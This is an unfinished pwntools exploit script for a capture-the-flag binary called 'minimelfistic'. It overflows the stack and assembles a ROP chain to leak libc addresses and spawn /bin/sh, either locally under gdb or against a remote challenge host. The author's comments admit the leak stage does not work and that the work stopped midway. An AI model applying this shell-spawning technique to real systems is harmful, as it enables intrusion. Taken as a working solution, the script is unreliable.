# #!/usr/bin/env python

from pwn import *

context.arch = "x86_64"
get_flag = False
chall_name = 'minimelfistic'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main+258''')

def adjust_bytes_leaked_address(byte_address):
    bytearray_address = bytearray(byte_address)
    bytearray_address.reverse()
    address = int(bytearray_address.hex(), 16)
    return address

def run_exploit(p, debug):
    binary = ELF(chall_name)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    print(p.recvuntil(b'>').decode())

    if debug:
        run_with_gdb(p)

    overflow_until_rbp = b'A' * (cyclic_find('iaaaaaaa', n=8))

    # STAGE 1 leaking write to calculate libc
    # wont work because i never had heard of ret2csu :(
    rop = ROP(chall_name)
    print(rop.rdi)
    print(rop.rsi)

    rop.raw(rop.rdi) # pop rdi, ret
    rop.raw(0x1)
    rop.raw(rop.rsi) # pop rsi, pop r15, ret
    rop.raw(binary.got.write)
    rop.raw(0x1)
    #rop.raw(rop.rdx)
    #rop.raw(0x20)
    rop.raw(binary.plt.write)
    rop.raw(binary.entrypoint)

    # overflowing to RBP
    p.sendline(overflow_until_rbp + b'BBBBBBBB' + rop.chain())

    # exiting to LEAVE and put RBP to RIP (Pivoting, sort of)
    print(p.recvuntil(b'>').decode())
    p.sendline(b'9')

    # stopped here, didnt had the time to work more
    p.interactive()
    exit()

    print(p.recv(timeout=2).decode())
    p.recvline()
    print(p.recvline().decode())
    puts_leaked = p.recvline()[:-1]
    print(puts_leaked)
    
    puts_adjusted = adjust_bytes_leaked_address(puts_leaked)
    print('leaked puts:', hex(puts_adjusted))
    p.interactive()
    exit()

    bin_sh_libc = next(libc.search(b'/bin/sh'))

    rop = ROP(chall_name)
    #rop.call(libc.sym.setreuid, [0, 0])
    rop.call(libc.sym.system, [bin_sh_libc])
    print(rop.dump())

    overflow = cyclic(299, n=8)
    p.sendline(overflow_until_rbp + b'BBBBBBBB' + rop.chain())

    print(p.recvuntil(b'>').decode())
    p.sendline(b'9')


    p.interactive()
    # mouting rop chain
    rop = ROP(chall_name)
    bin_sh_libc = next(libc.search(b'/bin/sh'))
    # i need a empty ret address here because the movaps instrunction in system will trigger
    # a sigsev because of the ABI rule. The rule says that the stack has to be aligned to 16 bytes
    # before doing a call (more research needed on this)
    # https://newbedev.com/why-does-the-mac-abi-require-16-byte-stack-alignment-for-x86-32
    #rop.raw(rop.ret.address)
    #rop.call(libc.sym.setreuid, [0, 0])
    #rop.call(libc.sym.system, [bin_sh_libc])
    rop.raw(rop.rdi.address)
    rop.raw((bin_sh_libc))
    rop.raw(rop.ret)
    #rop.raw(libc.sym.system)

    #p.sendline(overflow)
    #p.sendline(overflow_until_ret + rop.chain())

if get_flag:
    #ssh_connection = ssh(host='ssh',user='hacker')
    #process_full_path = '/challenge/' + chall_name
    #p = ssh_connection.run(process_full_path)
    
    #run_exploit(p, False)
    #ssh_connection.close()
    p = remote('178.62.32.210', '30138')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    # target=process(\['/path/to/loader','/path/to/binary'\],env={"LD\_PRELOAD":"/path/to/desired/libc"})
    p = process(process_full_path)
    run_exploit(p, True)